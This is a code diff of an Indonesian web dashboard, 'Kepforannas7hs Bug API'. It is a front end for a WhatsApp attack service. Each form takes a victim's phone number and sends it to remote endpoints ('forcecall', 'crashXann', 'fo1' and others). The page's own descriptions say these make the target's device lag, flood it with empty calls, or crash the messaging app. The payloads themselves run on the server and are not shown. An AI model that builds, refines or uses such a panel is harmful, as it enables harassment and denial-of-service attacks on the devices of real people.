@@ -3,22 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kepforannas7hs Bug API</title>
+    <title>Kepforannas7hs</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=JetBrains+Mono:wght@400;700&display=swap">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
+        /* Definisi variabel warna dan font */
         :root {
             --bg-dark: #0a0a0a;
-            --card-bg: #1a1a1a;
+            --card-bg: rgba(26, 26, 26, 0.7); /* Transparan untuk efek kaca */
             --text-light: #ffffff;
             --text-secondary: #aaaaaa;
             --accent-purple: #8e2de2;
             --accent-green: #43e97b;
             --accent-red: #ff5252;
-            --border-color: #333;
+            --border-color: rgba(51, 51, 51, 0.5);
             --gradient: linear-gradient(90deg, #8e2de2, #4a00e0);
+            --shadow-light: rgba(0, 0, 0, 0.2);
         }
         
+        /* Animasi pop-in untuk elemen */
+        @keyframes pop-in {
+            0% { transform: translateY(20px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Animasi berkedip untuk status dot */
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 5px var(--accent-green), 0 0 10px var(--accent-green); }
+            50% { box-shadow: 0 0 10px var(--accent-green), 0 0 20px var(--accent-green); }
+        }
+
+        /* Styling dasar untuk seluruh halaman */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -30,472 +45,356 @@
             background-color: var(--bg-dark);
             color: var(--text-light);
             display: flex;
-            flex-direction: column;
-            align-items: center;
+            justify-content: center;
+            align-items: flex-start; /* Ubah ke flex-start agar bisa di-scroll */
             min-height: 100vh;
             padding: 40px 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle, var(--accent-purple) 0%, transparent 20%),
-                        radial-gradient(circle, var(--accent-green) 0%, transparent 20%);
-            background-repeat: no-repeat;
-            background-size: 500px 500px, 500px 500px;
-            background-position: top -100px left -100px, bottom -100px right -100px;
-            opacity: 0.1;
-            z-index: -1;
-            animation: moveGradient 20s infinite alternate;
-        }
-
-        @keyframes moveGradient {
-            0% { background-position: top -100px left -100px, bottom -100px right -100px; }
-            100% { background-position: top 100px left 100px, bottom 100px right 100px; }
+            overflow-y: auto; /* Memungkinkan scroll vertikal */
+            line-height: 1.6;
         }
 
         .container {
             width: 100%;
-            max-width: 1200px;
-            display: flex;
-            flex-direction: column;
-            gap: 30px;
-            z-index: 1;
-        }
-
-        .header {
+            max-width: 900px;
+            padding: 20px;
             text-align: center;
-            margin-bottom: 30px;
-            animation: fadeIn 1s ease-in-out;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
+        /* Gaya header */
+        .header {
+            margin-bottom: 40px;
+            animation: pop-in 0.8s ease-out;
         }
 
         .header h1 {
-            font-size: clamp(2rem, 5vw, 4rem);
+            font-size: 2.5rem;
             font-weight: 700;
             background: var(--gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 15px rgba(142, 45, 226, 0.5);
-            animation: textGlow 2s infinite alternate;
-        }
-        
-        @keyframes textGlow {
-            from { text-shadow: 0 0 10px rgba(142, 45, 226, 0.5); }
-            to { text-shadow: 0 0 20px rgba(142, 45, 226, 0.8), 0 0 30px rgba(74, 0, 224, 0.6); }
+            text-shadow: 0 0 10px var(--accent-purple);
         }
 
         .header p {
             font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
             color: var(--text-secondary);
-            font-size: clamp(0.8rem, 2vw, 1.2rem);
             margin-top: 10px;
+            letter-spacing: 1px;
         }
 
-        .main-content {
+        /* Gaya grid layout untuk kartu */
+        .card-grid {
             display: grid;
-            grid-template-columns: 1fr;
-            gap: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
         }
 
-        @media (min-width: 768px) {
-            .main-content {
-                grid-template-columns: 1fr 2fr;
-            }
-        }
-
+        /* Gaya kartu umum */
         .card {
             background-color: var(--card-bg);
-            border-radius: 25px;
-            padding: 40px;
+            border-radius: 15px;
+            padding: 25px;
+            backdrop-filter: blur(10px);
             border: 1px solid var(--border-color);
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            animation: slideIn 1s ease-out;
+            box-shadow: 0 8px 32px var(--shadow-light);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            animation: pop-in 0.8s ease-out;
+            animation-delay: var(--delay);
+            animation-fill-mode: both;
         }
-        
-        @keyframes slideIn {
-            from { transform: translateY(20px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        
+
         .card:hover {
-            transform: translateY(-10px) scale(1.02);
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px var(--shadow-light);
         }
 
         .card h2 {
-            font-size: clamp(1.5rem, 3vw, 2rem);
-            margin-bottom: 25px;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 20px;
-            background: var(--gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--text-light);
+        }
+
+        /* Gaya bagian info sistem */
+        .info-card h2 {
             display: flex;
             align-items: center;
-            gap: 10px;
+            justify-content: center;
         }
 
-        .card h2 i {
-            font-size: clamp(1.2rem, 2.5vw, 1.8rem);
+        .info-card i {
+            margin-right: 10px;
+            color: var(--accent-green);
         }
 
-        .info-section, .form-section {
-            display: flex;
-            flex-direction: column;
-            gap: 25px;
-        }
-
-        .info-item {
-            display: flex;
-            align-items: center;
-            gap: 15px;
+        .info-card p {
             font-family: 'JetBrains Mono', monospace;
-            font-size: clamp(0.9rem, 2vw, 1rem);
+            font-size: 0.9rem;
             color: var(--text-secondary);
-        }
-
-        .info-item i {
-            font-size: 1.4rem;
-            color: var(--accent-purple);
-        }
-        
-        .status-dot {
-            width: 16px;
-            height: 16px;
-            border-radius: 50%;
-            animation: pulse 2s infinite cubic-bezier(0.4, 0, 0.6, 1);
-        }
-
-        .status-dot.online {
-            background-color: var(--accent-green);
-            box-shadow: 0 0 15px var(--accent-green);
-        }
-
-        .status-dot.offline {
-            background-color: var(--accent-red);
-            box-shadow: 0 0 15px var(--accent-red);
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(0.95); opacity: 0.8; }
-            50% { transform: scale(1.05); opacity: 1; }
-            100% { transform: scale(0.95); opacity: 0.8; }
-        }
-
-        .form-group label {
-            display: block;
+            text-align: left;
             margin-bottom: 10px;
+        }
+
+        .info-card p strong {
             color: var(--text-light);
             font-weight: 600;
         }
 
-        .form-group input {
-            width: 100%;
-            padding: 18px;
-            border-radius: 12px;
+        /* Gaya status bot */
+        .bot-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .bot-status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+
+        .bot-status-dot.online {
+            background-color: var(--accent-green);
+            animation: pulse 2s infinite;
+        }
+
+        .bot-status-dot.offline {
+            background-color: var(--accent-red);
+        }
+
+        .bot-status-text {
+            color: var(--accent-green);
+            font-weight: 600;
+        }
+
+        /* Gaya form dan input */
+        .bug-form form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .bug-form input[type="text"] {
+            padding: 12px;
             border: 1px solid var(--border-color);
-            background-color: #2a2a2a;
+            background-color: var(--bg-dark);
             color: var(--text-light);
-            font-family: 'JetBrains Mono', monospace;
+            border-radius: 8px;
+            font-family: 'Poppins', sans-serif;
             transition: all 0.3s ease;
         }
 
-        .form-group input:focus {
+        .bug-form input[type="text"]:focus {
             outline: none;
             border-color: var(--accent-purple);
-            box-shadow: 0 0 0 4px rgba(142, 45, 226, 0.3);
+            box-shadow: 0 0 5px rgba(142, 45, 226, 0.5);
         }
-
-        .btn-send {
-            width: 100%;
-            padding: 18px 25px;
+        
+        .btn {
             background: var(--gradient);
-            border: none;
-            border-radius: 12px;
             color: var(--text-light);
-            font-weight: 700;
-            font-size: 1rem;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
             position: relative;
             overflow: hidden;
+            letter-spacing: 0.5px;
         }
 
-        .btn-send::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 300%;
-            height: 300%;
-            background: rgba(255, 255, 255, 0.15);
-            transition: all 0.5s ease;
-            transform: translate(-50%, -50%) rotate(45deg);
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
         }
 
-        .btn-send:hover::before {
-            width: 0;
-            height: 0;
-        }
-
-        .btn-send:disabled {
-            background: var(--border-color);
+        .btn:disabled {
+            background: #333;
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
         }
 
-        .toast-container {
+        .btn i {
+            margin-right: 8px;
+        }
+        
+        /* Gaya notifikasi toast */
+        #toast-container {
             position: fixed;
-            bottom: 30px;
-            right: 30px;
-            z-index: 1000;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
             display: flex;
-            flex-direction: column-reverse;
-            gap: 15px;
+            flex-direction: column;
+            gap: 10px;
+            z-index: 1000;
         }
 
         .toast {
-            background-color: #333;
+            background-color: rgba(30, 30, 30, 0.9);
             color: white;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
-            opacity: 0;
-            transform: translateX(100px);
-            transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            min-width: 300px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            min-width: 250px;
+            text-align: center;
             font-family: 'Poppins', sans-serif;
-            font-size: 0.9rem;
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+        
+        .toast.success { border-left: 5px solid var(--accent-green); }
+        .toast.error { border-left: 5px solid var(--accent-red); }
+        .toast.info { border-left: 5px solid var(--accent-purple); }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .toast i {
-            font-size: 1.6rem;
-        }
-
-        .toast.show {
-            opacity: 1;
-            transform: translateX(0);
-        }
-
-        .toast.success { background: var(--accent-green); }
-        .toast.error { background: var(--accent-red); }
-        .toast.info { background: var(--accent-purple); }
-
-        .api-endpoints-section {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-            margin-top: 30px;
-        }
-
-        .endpoint-card {
-            background-color: #2a2a2a;
-            padding: 30px;
-            border-radius: 20px;
-            border: 1px solid #444;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            transition: transform 0.3s ease;
-        }
-
-        .endpoint-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .endpoint-card h3 {
-            font-size: clamp(1.2rem, 2vw, 1.5rem);
-            color: var(--accent-green);
-        }
-
-        .endpoint-card p {
-            font-size: 0.9rem;
-            color: var(--text-secondary);
-        }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Bagian Header -->
         <header class="header">
-            <h1>Kepforannas7hs Bug API</h1>
-            <p>Platform REST API Profesional & Inovatif</p>
+            <h1>Kepforannas7hs API Dashboard</h1>
+            <p>Admin Panel & System Information</p>
         </header>
 
-        <div class="main-content">
-            <div class="card system-info-card">
-                <h2><i class="fas fa-microchip"></i> System Information</h2>
-                <div class="info-section">
-                    <div class="info-item">
-                        <i class="fas fa-robot"></i>
-                        <span id="botStatusDot" class="status-dot offline"></span>
-                        <span id="botStatusText">Bot is Offline</span>
-                    </div>
-                    <div class="info-item">
-                        <i class="fas fa-clock"></i>
-                        <span id="currentTime">Memuat...</span>
-                    </div>
-                    <div class="info-item">
-                        <i class="fas fa-map-marker-alt"></i>
-                        <span id="ipLocation">Memuat...</span>
-                    </div>
+        <!-- Bagian Informasi Sistem -->
+        <section class="card-grid" style="margin-bottom: 40px;">
+            <div class="card info-card" style="--delay: 0.2s;">
+                <h2><i class="fas fa-robot"></i> Status Bot</h2>
+                <div class="bot-status">
+                    <span id="botStatusDot" class="bot-status-dot offline"></span>
+                    <span id="botStatusText" class="bot-status-text">Offline</span>
                 </div>
             </div>
-
-            <div class="card">
-                <h2><i class="fas fa-bug"></i> Bug Endpoints</h2>
-                <div class="api-endpoints-section">
-                    <!-- Bug 1: Carousels -->
-                    <div class="endpoint-card">
-                        <h3>Carousels</h3>
-                        <p>Mengirim pesan interaktif dengan banyak item yang membuat perangkat target lambat.</p>
-                        <form class="bugForm" data-endpoint="carousels">
-                            <div class="form-group">
-                                <label for="targetNumber-1">Nomor Telepon:</label>
-                                <input type="text" id="targetNumber-1" name="targetNumber" placeholder="Contoh: 6281234567890" required>
-                            </div>
-                            <button type="submit" class="btn-send">
-                                <i class="fas fa-paper-plane"></i> Kirim
-                            </button>
-                        </form>
-                    </div>
-
-                    <!-- Bug 2: Force Call -->
-                    <div class="endpoint-card">
-                        <h3>Force Call</h3>
-                        <p>Mengirim panggilan kosong secara terus-menerus ke nomor target.</p>
-                        <form class="bugForm" data-endpoint="forcecall">
-                            <div class="form-group">
-                                <label for="targetNumber-2">Nomor Telepon:</label>
-                                <input type="text" id="targetNumber-2" name="targetNumber" placeholder="Contoh: 6281234567890" required>
-                            </div>
-                            <button type="submit" class="btn-send">
-                                <i class="fas fa-paper-plane"></i> Kirim
-                            </button>
-                        </form>
-                    </div>
-
-                    <!-- Bug 3: FO1 -->
-                    <div class="endpoint-card">
-                        <h3>Delay</h3>
-                        <p>Mengirim pesan foto 'sekali lihat' yang berat dan membuat perangkat target lag.</p>
-                        <form class="bugForm" data-endpoint="fo1">
-                            <div class="form-group">
-                                <label for="targetNumber-3">Nomor Telepon:</label>
-                                <input type="text" id="targetNumber-3" name="targetNumber" placeholder="Contoh: 6281234567890" required>
-                            </div>
-                            <button type="submit" class="btn-send">
-                                <i class="fas fa-paper-plane"></i> Kirim
-                            </button>
-                        </form>
-                    </div>
-
-                    <!-- Bug 4: Crash -->
-                    <div class="endpoint-card">
-                        <h3>Crash</h3>
-                        <p>Mengirim pesan yang dirancang khusus untuk membuat aplikasi target macet.</p>
-                        <form class="bugForm" data-endpoint="crash">
-                            <div class="form-group">
-                                <label for="targetNumber-4">Nomor Telepon:</label>
-                                <input type="text" id="targetNumber-4" name="targetNumber" placeholder="Contoh: 6281234567890" required>
-                            </div>
-                            <button type="submit" class="btn-send">
-                                <i class="fas fa-paper-plane"></i> Kirim
-                            </button>
-                        </form>
-                    </div>
-                </div>
+            <div class="card info-card" style="--delay: 0.3s;">
+                <h2><i class="fas fa-server"></i> Info Server</h2>
+                <p><strong>IP Anda:</strong> <span id="ipAddressText">Loading...</span></p>
+                <p><strong>Lokasi Anda:</strong> <span id="ipLocationText">Loading...</span></p>
             </div>
-        </div>
+        </section>
+
+        <!-- Bagian Bug API Forms -->
+        <section class="card-grid">
+            <!-- Kartu untuk Bug Force Call -->
+            <div class="card bug-form" style="--delay: 0.4s;">
+                <h2><i class="fas fa-bug"></i> Force Call</h2>
+                <form id="forceCallForm" data-endpoint="forcecall">
+                    <input type="text" name="targetNumber" placeholder="Masukkan Nomor Target (e.g., 628xxxxxxx)" required>
+                    <button type="submit" class="btn btn-send"><i class="fas fa-paper-plane"></i> Kirim</button>
+                </form>
+            </div>
+            
+            <!-- Kartu untuk Bug Crash Xann -->
+            <div class="card bug-form" style="--delay: 0.5s;">
+                <h2><i class="fas fa-bug"></i> Crash Xann</h2>
+                <form id="crashXannForm" data-endpoint="crashXann">
+                    <input type="text" name="targetNumber" placeholder="Masukkan Nomor Target (e.g., 628xxxxxxx)" required>
+                    <button type="submit" class="btn btn-send"><i class="fas fa-paper-plane"></i> Kirim</button>
+                </form>
+            </div>
+            
+            <!-- Kartu untuk Bug XanfcXscary -->
+            <div class="card bug-form" style="--delay: 0.6s;">
+                <h2><i class="fas fa-bug"></i> XanfcXscary</h2>
+                <form id="xanfcXscaryForm" data-endpoint="xanfcXscary">
+                    <input type="text" name="targetNumber" placeholder="Masukkan Nomor Target (e.g., 628xxxxxxx)" required>
+                    <button type="submit" class="btn btn-send"><i class="fas fa-paper-plane"></i> Kirim</button>
+                </form>
+            </div>
+            
+            <!-- Kartu untuk Bug FO1 -->
+            <div class="card bug-form" style="--delay: 0.7s;">
+                <h2><i class="fas fa-bug"></i> FO1</h2>
+                <form id="fo1Form" data-endpoint="fo1">
+                    <input type="text" name="targetNumber" placeholder="Masukkan Nomor Target (e.g., 628xxxxxxx)" required>
+                    <button type="submit" class="btn btn-send"><i class="fas fa-paper-plane"></i> Kirim</button>
+                </form>
+            </div>
+        </section>
     </div>
 
-    <div class="toast-container" id="toastContainer"></div>
+    <!-- Container untuk notifikasi toast -->
+    <div id="toast-container"></div>
 
     <script>
-        // Ganti URL ini dengan URL domain server Anda yang berjalan di panel
-        const API_URL = 'https://ptero.v1.lynz.biz.id/server/7346d430/files#/session';
+        // URL API, pastikan ini sesuai dengan konfigurasi server Anda
+        const API_URL = 'https://ptero.v1.lynz.biz.id';
 
-        const bugForms = document.querySelectorAll('.bugForm');
-        const botStatusDot = document.getElementById('botStatusDot');
-        const botStatusText = document.getElementById('botStatusText');
-        const currentTimeText = document.getElementById('currentTime');
-        const ipLocationText = document.getElementById('ipLocation');
-        const toastContainer = document.getElementById('toastContainer');
-
-        function showToast(message, type = 'info') {
+        // Fungsi untuk menampilkan notifikasi toast
+        function showToast(message, type) {
+            const toastContainer = document.getElementById('toast-container');
             const toast = document.createElement('div');
-            toast.classList.add('toast', type);
-            const icon = type === 'success' ? 'fas fa-check-circle' : (type === 'error' ? 'fas fa-times-circle' : 'fas fa-info-circle');
-            toast.innerHTML = `<i class="${icon}"></i> <span>${message}</span>`;
+            toast.className = `toast ${type}`;
+            toast.textContent = message;
             toastContainer.appendChild(toast);
-            
-            setTimeout(() => {
-                toast.classList.add('show');
-            }, 10);
 
             setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => toast.remove(), 600);
+                toast.remove();
             }, 5000);
         }
 
+        // Fungsi untuk memperbarui informasi sistem
         async function updateSystemInfo() {
+            const ipAddressText = document.getElementById('ipAddressText');
+            const ipLocationText = document.getElementById('ipLocationText');
+            const botStatusDot = document.getElementById('botStatusDot');
+            const botStatusText = document.getElementById('botStatusText');
+
+            // Mengambil IP Address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+                ipAddressText.textContent = ipAddress;
+
+                // Mengambil lokasi berdasarkan IP
+                const locationResponse = await fetch(`https://api.ip-api.com/json/${ipAddress}`);
+                const locationData = await locationResponse.json();
+                if (locationData.status === 'success') {
+                    ipLocationText.textContent = `${locationData.city}, ${locationData.country}`;
+                } else {
+                    ipLocationText.textContent = 'Lokasi tidak diketahui';
+                }
+            } catch (error) {
+                ipAddressText.textContent = 'Gagal memuat';
+                ipLocationText.textContent = 'Lokasi tidak diketahui';
+            }
+
+            // Mengambil status bot
             try {
                 const statusResponse = await fetch(`${API_URL}/status`);
                 const statusData = await statusResponse.json();
-                if (statusData.status === 'Online') {
+                if (statusData.status === 'online') {
                     botStatusDot.classList.remove('offline');
                     botStatusDot.classList.add('online');
-                    botStatusText.textContent = 'Bot is Online';
+                    botStatusText.textContent = 'Online';
+                    botStatusText.style.color = 'var(--accent-green)';
                 } else {
                     botStatusDot.classList.remove('online');
                     botStatusDot.classList.add('offline');
-                    botStatusText.textContent = 'Bot is Offline';
+                    botStatusText.textContent = 'Offline';
+                    botStatusText.style.color = 'var(--accent-red)';
                 }
             } catch (error) {
-                console.error('Failed to fetch bot status:', error);
                 botStatusDot.classList.remove('online');
                 botStatusDot.classList.add('offline');
-                botStatusText.textContent = 'Failed to get status';
-            }
-
-            currentTimeText.textContent = new Date().toLocaleString('id-ID', { 
-                timeZone: 'Asia/Jakarta',
-                weekday: 'short', year: 'numeric', month: 'short', day: 'numeric',
-                hour: '2-digit', minute: '2-digit', second: '2-digit'
-            });
-
-            try {
-                const ipResponse = await fetch('http://ip-api.com/json/');
-                const ipData = await ipResponse.json();
-                if (ipData.status === 'success') {
-                    ipLocationText.textContent = `${ipData.city}, ${ipData.regionName}, ${ipData.country}`;
-                } else {
-                    ipLocationText.textContent = 'Location unknown';
-                }
-            } catch (error) {
-                ipLocationText.textContent = 'Location unknown';
-                console.error('Failed to fetch IP location:', error);
+                botStatusText.textContent = 'Gagal terhubung';
+                botStatusText.style.color = 'var(--accent-red)';
             }
         }
-
-        bugForms.forEach(form => {
+        
+        // Menangani pengiriman form
+        document.querySelectorAll('.bug-form form').forEach(form => {
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 const endpoint = form.dataset.endpoint;
@@ -509,8 +408,8 @@
 
                 const sendBtn = form.querySelector('.btn-send');
                 sendBtn.disabled = true;
-                sendBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
-                showToast(`Mengirim permintaan ${endpoint}...`, 'info');
+                sendBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Memproses...`;
+                showToast(`Mengirim permintaan ${endpoint.toUpperCase()}...`, 'info');
 
                 const url = `${API_URL}/bug/${endpoint}?target=${encodeURIComponent(targetNumber)}`;
 
@@ -532,9 +431,11 @@
             });
         });
 
+        // Panggil fungsi saat halaman dimuat dan setiap 10 detik
         updateSystemInfo();
         setInterval(updateSystemInfo, 10000);
     </script>
+      <script src="index.js"></script>
 </body>
 </html>
 
